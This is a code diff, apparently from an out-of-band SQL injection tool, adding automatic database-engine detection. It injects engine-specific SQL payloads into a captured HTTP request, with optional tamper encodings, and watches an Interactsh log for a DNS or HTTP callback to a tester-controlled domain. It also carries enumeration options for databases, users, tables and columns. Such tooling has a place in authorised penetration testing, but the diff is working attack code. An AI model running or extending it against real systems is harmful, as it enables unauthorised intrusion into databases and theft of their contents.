@@ -595,6 +595,48 @@ def flush_session_once(args):
 
 _ENUM_KEYS = ("dbs", "banner", "current_user", "current_db", "tables", "columns")
 
+# Primary profiles tried during DBMS auto-detection (one per engine, most common first)
+_DETECT_ORDER = ["mysql", "mssql", "postgres-program", "oracle-http", "sqlite-lab"]
+
+
+def _detect_dbms(args) -> str | None:
+    request = parse_raw_request(args.request)
+    domain = normalize_domain(args.domain)
+    log = MultiInteractshLog(args.log) if len(args.log) > 1 else InteractshLog(args.log[0])
+    run_id = args.run_id or uuid.uuid4().hex[:6]
+    tamper_names = [t.strip() for t in getattr(args, "tamper", "").split(",") if t.strip()]
+
+    candidates = [p for p in _DETECT_ORDER if p in PROFILES]
+    _log("INFO", f"--dbms not set — probing {len(candidates)} engines: {', '.join(candidates)}")
+
+    for profile_name in candidates:
+        profile = PROFILES[profile_name]
+        base = args.base
+        if base is None and args.param:
+            base = current_value(request, args.param, args.place)
+        base = base or ""
+
+        token = f"{run_id}-detect-{profile_name}"
+        payload = profile.payload(base, "1=1", f"{token}.{domain}")
+        if tamper_names:
+            payload = apply_tampers(payload, tamper_names)
+
+        injected = inject(request, args.param or "", payload, args.place)
+        try:
+            send(injected, force_ssl=args.force_ssl, timeout=args.http_timeout,
+                 proxy=getattr(args, "proxy", None),
+                 verify_ssl=not getattr(args, "no_verify_ssl", False))
+        except Exception:
+            pass
+
+        hit = log.wait_any({token: profile_name}, args.timeout)
+        if hit:
+            _log("INFO", _hi(f"identified DBMS: {profile_name}"))
+            return profile_name
+        _log("DEBUG", f"no callback — {profile_name}")
+
+    return None
+
 
 def run(args) -> int:
     if getattr(args, "enum_all", False):
@@ -602,12 +644,19 @@ def run(args) -> int:
 
     for flag, val in [
         ("-r/--request", getattr(args, "request", None)),
-        ("--dbms",       getattr(args, "dbms",    None)),
         ("--domain",     getattr(args, "domain",  None)),
         ("--log",        getattr(args, "log",     None)),
     ]:
         if not val:
             raise SystemExit(f"the following argument is required: {flag}")
+
+    if not args.dbms:
+        args.dbms = _detect_dbms(args)
+        if not args.dbms:
+            raise SystemExit(
+                "could not auto-detect DBMS — no OOB callback received for any engine. "
+                "Specify --dbms explicitly or check your --domain/--log setup."
+            )
 
     is_enum = any(getattr(args, k, False) for k in _ENUM_KEYS)
     if args.alphabet is None:
